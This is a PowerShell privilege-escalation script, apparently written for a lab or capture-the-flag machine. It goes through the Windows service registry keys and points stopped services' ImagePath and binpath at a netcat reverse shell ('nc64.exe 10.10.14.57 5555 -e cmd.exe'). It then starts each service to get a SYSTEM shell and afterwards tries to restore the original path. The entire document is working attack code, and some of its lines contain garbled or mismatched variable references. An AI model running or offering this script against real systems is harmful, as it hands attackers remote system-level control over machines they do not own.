$reg = Get-Item HKLM:\System\CurrentControlSet\services\*
$pspath = 'C:\Users\Hector\Links\nc64.exe 10.10.14.57 5555 -e C:\WINDOWS\SYSTEM32\cmd.exe'
$ErrorActionPreference= 'silentlycontinue'

foreach ($r in $reg) {
   $s1 = $r.PSPath.tostring()
   $xd = $s1.Substring($s1.LastIndexOf("\")+1)
   
   $ss = Get-Service $xd

   if($?){
       if($ss.Status -eq "Stopped"){
            if(Test-Path ($r.PSPath.ToString()+"\Parameters")){
                Get-Service $xd                
                #Write-Host "Success"
                    $oldpath = Get-ItemPropertyValue $reg.P$reSPath -Name ImagePath -ErrorAction SilentlyContinue

                    Set-ItemProperty -Path $reg.PSPath -Name ImagePath -Value $pspath

                    sc.exe config $xd binpath= $pspath

                    Start-Service $xd

            #wait
            $maxRepeat = 20
            $status = "Running" # change to Stopped if you want to wait for services to start

            do 
            {
                $count = (Get-Service $xd | ? {$_.status -eq $status}).count
                $maxRepeat--
                sleep -Milliseconds 600
            } until ($count -eq 0 -or $maxRepeat -eq 0)

                    #revert now
                    Get-Service $xd | Stop-Service
                    Set-ItemProperty -Path $r.PSPath -Name ImagePath -Value $oldpath 
                    Start-Service $xd        

            }
         
       }
       else{
        #Write-Host "Failed"
       }
   }
}